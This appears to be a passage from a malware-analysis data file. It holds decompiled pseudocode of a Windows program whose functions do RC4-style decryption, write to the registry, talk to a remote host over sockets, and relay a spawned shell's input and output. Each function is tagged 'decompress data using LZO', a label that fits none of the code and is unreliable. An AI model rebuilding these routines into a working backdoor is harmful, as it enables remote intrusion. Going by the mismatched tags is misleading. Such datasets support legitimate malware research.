var_4ch;\n                puStack256 = 0x4690f8;\n                (*var_40h)();\n            }\n            puStack252 = 0x4690fc;\n            (*var_3ch)();\n        }\n        puStack252 = 0x469104;\n        fcn.004058fc();\n        puStack252 = 0x46910e;\n        fcn.00405664();\n    }\n    *in_FS_OFFSET = uStack248;\n    uStack240 = 0x469140;\n    uStack244 = 0x46912b;\n    fcn.00405490();\n    uStack244 = 0x469138;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 5575
    },
    "00469444": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00469444(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4694b5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00409dfc();\n            fcn.00405738();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4694bc;\n    uStack32 = 0x4694b4;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 235
    },
    "004694c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004694c4(uint param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4694da;\n    fcn.004058ec();\n    uStack32 = 0x469642;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        uVar1 = *(in_EAX - 4);\n    }\n    uVar1 = uVar1 & 0x80000001;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n    }\n    if (uVar1 == 0) {\n        puStack28 = &stack0xfffffffc;\n        fcn.00405b8c();\n        iVar4 = *param_2;\n        if (iVar4 != 0) {\n            iVar4 = *(iVar4 + -4);\n        }\n        if (0 < iVar4) {\n            iVar3 = 1;\n            do {\n                if (*((in_EAX - 2) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 2) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x37;\n                }\n                iVar2 = fcn.0040595c();\n                *(iVar2 + -1 + iVar3) = *(*param_2 + -1 + iVar3) << 4;\n                if (*((in_EAX - 1) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 1) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x37;\n                }\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x469649;\n    uStack32 = 0x469641;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 773
    },
    "00469650": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00469650(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x46967b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack1076 = 0x469683;\n    fcn.004058ec();\n    uStack1080 = 0x46991d;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406a14(iVar4);\n                fcn.0040595c();\n                fcn.0046943c();\n            }\n            else {\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406a14(0x100);\n                fcn.0040595c();\n                fcn.0046943c();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.00469650::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.00469650::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.00469650::var_41ch)[uVar3];\n                (&fcn.00469650::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406a14(iVar4);\n            fcn.0040595c();\n            fcn.0046943c();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.00469650::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.00469650::var_41ch + uVar3);\n                    (&fcn.00469650::var_41ch)[uVar3] = (&fcn.00469650::var_41ch)[uVar6];\n                    (&fcn.00469650::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.00469650::var_41ch)[uVar3] + (&fcn.00469650::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.00469650::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405b8c();\n            fcn.0040595c();\n            fcn.0046943c();\n            fcn.00469444();\n            fcn.004054c0();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x469924;\n    uStack1080 = 0x4698fc;\n    fcn.0040546c();\n    uStack1080 = 0x46990f;\n    fcn.00406018();\n    uStack1080 = 0x46991c;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1507
    },
    "0046992c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046992c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x469957;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack1076 = 0x46995f;\n    fcn.004058ec();\n    uStack1080 = 0x469bf8;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            puStack1076 = &stack0xfffffffc;\n            fcn.004694c4();\n            fcn.00405504();\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                fcn.00406a14(iVar4);\n                fcn.0040595c();\n                fcn.0046943c();\n            }\n            else {\n                fcn.00406a14(0x100);\n                fcn.0040595c();\n                fcn.0046943c();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.0046992c::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.0046992c::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.0046992c::var_41ch)[uVar3];\n                (&fcn.0046992c::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406a14(iVar4);\n            fcn.0040595c();\n            fcn.0046943c();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.0046992c::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.0046992c::var_41ch + uVar3);\n                    (&fcn.0046992c::var_41ch)[uVar3] = (&fcn.0046992c::var_41ch)[uVar6];\n                    (&fcn.0046992c::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.0046992c::var_41ch)[uVar3] + (&fcn.0046992c::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.0046992c::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405b8c();\n            fcn.0040595c();\n            fcn.0046943c();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x469bff;\n    uStack1080 = 0x469bd7;\n    fcn.0040546c();\n    uStack1080 = 0x469bea;\n    fcn.00406018();\n    uStack1080 = 0x469bf7;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1508
    },
    "0046d788": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d788(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0040aaa0(param_1);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x104);\n    fcn.00405664();\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*in_EAX + -1 + iVar2) != '\\\\') {\n        fcn.00405738();\n    }\n    fcn.0040aaec();\n    return;\n}\n",
        "token_count": 155
    },
    "0046f650": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0046f650(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x46f66c;\n    fcn.004058ec();\n    puStack32 = 0x46f674;\n    fcn.004058ec();\n    uStack36 = 0x46f6d9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack32 = &stack0xfffffffc;\n    if (0 < in_EAX) {\n        do {\n            fcn.00405654();\n            fcn.00405894();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x46f6e0;\n    uStack36 = 0x46f6d8;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 285
    },
    "00471384": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471384(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x47139c;\n    fcn.004058ec();\n    puStack28 = 0x4713a4;\n    fcn.004058ec();\n    puStack28 = 0x4713ac;\n    fcn.004058ec();\n    uStack32 = 0x47142d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004058fc(&fcn.00471384::hKey);\n    sub.advapi32.dll_RegCreateKeyA();\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar1 = fcn.004058fc(arg_8h);\n    uVar1 = fcn.004058fc(0, 2, uVar1);\n    sub.advapi32.dll_RegSetValueExA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405490(0x471434);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 335
    },
    "00471c04": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00471dc9)\n// WARNING: Removing unreachable block (ram,0x00471cf4)\n// WARNING: Removing unreachable block (ram,0x00471d5b)\n// WARNING: Removing unreachable block (ram,0x00471e37)\n\nvoid fcn.00471c04(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack516;\n    uint uStack512;\n    uchar *puStack508;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack508 = &stack0xfffffffc;\n    uStack512 = 0x471ebc;\n    uStack516 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdfc;\n    fcn.00471bc4();\n    fcn.00405784();\n    cVar1 = fcn.00471b64();\n    if (cVar1 != '\\0') {\n        fcn.00405b8c();\n        fcn.00403764();\n        fcn.004034e8();\n        fcn.0040304c();\n        while( true ) {\n            fcn.00403a74();\n            cVar1 = fcn.0040304c();\n            if (cVar1 != '\\0') break;\n            fcn.00405738();\n            fcn.00403c7c();\n            fcn.00403ce8();\n            fcn.0040304c();\n            iVar2 = fcn.00405a48();\n            if (iVar2 != 0) {\n                fcn.00405b8c();\n                fcn.004059a4();\n                fcn.00405a48();\n                fcn.004059a4();\n                fcn.00405800(0x471f28, 0, *in_EAX);\n            }\n            iVar2 = fcn.00405a48();\n            if (iVar2 != 0) {\n                fcn.004059a4();\n                fcn.00405a48();\n                fcn.004059a4();\n                fcn.00405800(0x471f28, 0, *in_EAX);\n            }\n            iVar2 = fcn.00405a48();\n            if (iVar2 != 0) {\n                fcn.004059a4();\n                fcn.00405a48();\n                fcn.004059a4();\n                fcn.00405800(0x471f28, 0, *in_EAX);\n            }\n            iVar2 = fcn.00405a48();\n            if (iVar2 != 0) {\n                fcn.004059a4();\n                fcn.00405a48();\n                fcn.004059a4();\n                fcn.00405800(0x471f28, 0, *in_EAX);\n            }\n            fcn.00405738();\n        }\n    }\n    *in_FS_OFFSET = uStack516;\n    puStack508 = 0x471ec3;\n    uStack512 = 0x471eae;\n    fcn.0040546c();\n    uStack512 = 0x471ebb;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 756
    },
    "00472094": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004720d2)\n\nvoid fcn.00472094 noreturn (void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x472112;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar1 = sub.kernel32.dll_GetTickCount_1();\n    uVar2 = 0;\n    fcn.00409dd4(uVar1);\n    fcn.00405784(uVar1, uVar2);\n    uVar1 = fcn.0040595c(0, 0);\n    sub.wsock32.dll_send(*0x4987e4, uVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 235
    },
    "00472b58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00472b58(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x472b70;\n    fcn.004058ec();\n    uStack28 = 0x472bda;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00469650();\n    fcn.00405504();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    uVar1 = fcn.0040595c(in_EAX, 0);\n    uVar2 = *0x4987e4;\n    sub.wsock32.dll_send(*0x4987e4, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x472be1);\n    return;\n}\n",
        "token_count": 260
    },
    "00472bec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472bec(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x472c06;\n    fcn.004058ec();\n    uStack28 = 0x472c6b;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00469650();\n    fcn.00405504();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.0040595c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405490(0x472c72);\n    return;\n}\n",
        "token_count": 230
    },
    "0047e318": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047e318(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1472;\n    uint uStack1468;\n    uchar *puStack1464;\n    uint var_5a4h;\n    uint var_5a0h;\n    uint var_59ah;\n    int32_t var_596h;\n    uint var_592h;\n    uint var_58eh;\n    uint var_57eh;\n    uint var_17dh;\n    uint var_78h;\n    uint var_74h;\n    uint var_68h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1464 = &stack0xfffffffc;\n    var_5a0h = 0;\n    var_4h = 0;\n    uStack1468 = 0x47e5e7;\n    uStack1472 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1472;\n    puVar1 = fcn.00402ef0();\n    *puVar1 = 0xc;\n    puVar1[2] = 0xffffffff;\n    puVar1[1] = 0;\n    sub.kernel32.dll_CreatePipe(&var_8h, &var_ch, puVar1, 0);\n    sub.kernel32.dll_CreatePipe(&var_10h, &var_14h, puVar1, 0);\n    sub.kernel32.dll_GetEnvironmentVariableA(0x47e5f8, &var_17dh, 0x105);\n    fcn.00403aac();\n    var_68h = 0x44;\n    var_3ch = 0x101;\n    var_38h._0_2_ = 0;\n    var_30h = var_10h;\n    var_2ch = var_ch;\n    var_28h = var_ch;\n    uVar4 = 0;\n    iVar2 = sub.kernel32.dll_CreateProcessA(0, &var_17dh, puVar1, puVar1, 0xffffffff, 0, 0, 0, &var_68h, &var_78h);\n    if (iVar2 != 0) {\n        while (uVar4 = var_78h,  sub.kernel32.dll_GetExitCodeProcess(),  var_1ch == 0x103) {\n            fcn.0040546c();\n            uVar4 = var_8h;\n            sub.kernel32.dll_PeekNamedPipe(var_8h, 0, 0, 0, &var_18h, 0);\n            uVar3 = var_8h;\n            while ((var_8h = uVar3,  var_18h != 0 &&\n                   (iVar2 = sub.kernel32.dll_ReadFile_1(),  uVar4 = uVar3,  iVar2 != 0))) {\n                fcn.004056dc(&var_5a0h);\n                fcn.00405964();\n                fcn.00405738();\n                uVar4 = var_8h;\n                sub.kernel32.dll_PeekNamedPipe();\n                uVar3 = var_8h;\n            }\n            iVar2 = var_4h;\n            if (var_4h != 0) {\n                iVar2 = *(var_4h + -4);\n            }\n            if (0 < iVar2) {\n                var_20h = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14, uVar4);\n                fcn.004054c0();\n                fcn.004054c0();\n                fcn.004054c0();\n                fcn.004054c0();\n                fcn.004054c0();\n                uVar4 = sub.kernel32.dll_CreateThread(0, 0, fcn.00485178, var_20h, 0, &var_24h);\n                sub.kernel32.dll_CloseHandle_1(uVar4);\n            }\n            sub.user32.dll_GetMessageA();\n            if (var_596h == 6) {\n                sub.kernel32.dll_WriteFile_1(var_14h, var_58eh, var_592h, &var_18h, 0);\n                sub.kernel32.dll_WriteFile_1();\n            }\n        }\n    }\n    fcn.00472b58(uVar4);\n    sub.kernel32.dll_TerminateProcess(var_78h, 0);\n    sub.kernel32.dll_CloseHandle_1(var_78h);\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.00402f0c();\n    *0x498940 = 0;\n    *in_FS_OFFSET = var_74h;\n    fcn.00405490(0x47e5ee);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1167
    },
    "0047ef10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047ef10(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1eeh;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1ach;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    uint *puStack184;\n    uint *puStack180;\n    uint *puStack176;\n    uint *puStack172;\n    uint *puStack168;\n    uint *puStack164;\n    uint *puStack160;\n    uint *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    uint *puStack108;\n    uint uStack104;\n    uint uStack100;\n    int32_t iStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    int32_t iStack80;\n    uint *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint32_t uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    puStack144 = &stack0xfffffffc;\n    var_ch = 0x41;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    uStack36 = 0x47f613;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = &fcn.0047ef10::var_1ach;\n    uStack48 = 2;\n    uStack52 = 0x47ef3f;\n    sub.wsock32.dll_WSAStartup();\n    uStack52 = 0;\n    uStack56 = 1;\n    uStack60 = 2;\n    uStack64 = 0x47ef4c;\n    var_1ch = sub.wsock32.dll_socket();\n    if (var_1ch == 0xffffffff) {\n        uStack64 = 0x47ef5a;\n        sub.wsock32.dll_WSACleanup();\n    }\n    var_1bch._0_2_ = 2;\n    uStack64 = **0x4927c0;\n    uStack68 = 0x47ef71;\n    var_1bch._2_2_ = sub.wsock32.dll_htons();\n    uStack68 = 0x47ef84;\n    uStack68 = fcn.00489450();\n    uStack72 = 0x47ef8a;\n    var_1b8h = sub.wsock32.dll_inet_addr();\n    uStack72 = 0x10;\n    puStack76 = &fcn.0047ef10::var_1bch;\n    iStack80 = var_1ch;\n    uStack84 = 0x47efa2;\n    sub.wsock32.dll_connect();\n    uStack84 = 0;\n    uStack88 = 0x31;\n    puStack92 = &fcn.0047ef10::var_1eeh;\n    iStack96 = var_1ch;\n    uStack100 = 0x47efb6;\n    sub.wsock32.dll_recv();\n    uStack100 = 0x47efc8;\n    fcn.00403aac();\n    uStack100 = 0x47efda;\n    fcn.00409ce8();\n    uStack100 = 0x47eff0;\n    fcn.00405784();\n    uStack100 = 0x47effe;\n    fcn.00472bec();\n    uStack100 = 0;\n    uStack104 = 0x31;\n    puStack108 = &fcn.0047ef10::var_1eeh;\n    iStack112 = var_1ch;\n    iStack116 = 0x47f012;\n    sub.wsock32.dll_recv();\n    if (**0x492a4c == '\\0') {\n        iStack116 = var_1ch;\n        uStack120 = 0x47f5e1;\n        sub.wsock32.dll_closesocket();\n        uStack120 = 0;\n    // WARNING: Subroutine does not return\n        puStack124 = 0x47f5e8;\n        sub.kernel32.dll_ExitThread();\n    }\n    iStack116 = 0x47f029;\n    fcn.00403aac();\n    iStack116 = 0x47f031;\n    fcn.0040546c();\n    iStack116 = 0;\n    uStack120 = 0x31;\n    puStack124 = &fcn.0047ef10::var_1eeh;\n    iStack128 = var_1ch;\n    puStack132 = 0x47f045;\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 < 1) {\n        puStack132 = var_1ch;\n        uStack136 = 0x47f052;\n        sub.wsock32.dll_closesocket();\n        uStack136 = 0;\n    // WARNING: Subroutine does not return\n        uStack140 = 0x47f059;\n        sub.kernel32.dll_ExitThread();\n    }\n    puStack132 